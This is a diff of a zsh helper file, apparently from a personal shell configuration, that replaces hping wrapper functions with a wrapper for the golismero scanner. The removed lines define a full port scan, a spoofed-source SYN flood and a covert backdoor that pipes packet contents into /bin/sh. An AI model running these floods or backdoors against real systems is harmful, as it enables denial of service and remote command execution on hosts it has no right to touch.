@@ -1,8 +1,8 @@
 # {{{ File header. #############################################################
 #                                                                              #
 # File informations:                                                           #
-# - Name:    external-tools/hping.zsh                                          #
-# - Summary: Support for hping.                                                #
+# - Name:    external-tools/golismero.zsh                                      #
+# - Summary: Support for golismero.                                            #
 # - Authors:                                                                   #
 #   - Alessandro Molari <molari.alessandro@gmail.com> (alem0lars)              #
 #                                                                              #
@@ -32,30 +32,11 @@
 # }}} ##########################################################################
 
 
-if [[ "${commands[hping]}" ]]; then
+if [[ "${commands[golismero]}" ]]; then
 
-  # $1 = target address
-  # $2 = source interface
-  function hping-port-scan() {
-    sudo hping --scan 1-65535 -S $1 -I $2
-  }
-
-  # $1 = target address
-  function hping-syn-flood() {
-    sudo hping -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $1
-  }
-
-  # $1 = signature
-  # $2 = listen interface
-  function hping-backdoor-listen() {
-    hping -9 $1 -I $2 | /bin/sh
-  }
-
-  # $1 = signature
-  # $2 = command file
-  # $3 = target address
-  function hping-backdoor-send() {
-    hping -R -d 100 -c 1 -e $1 -E $2 $3
+  # $1 = target url
+  function golismero-scan() {
+    golismero scan $1
   }
 
 fi
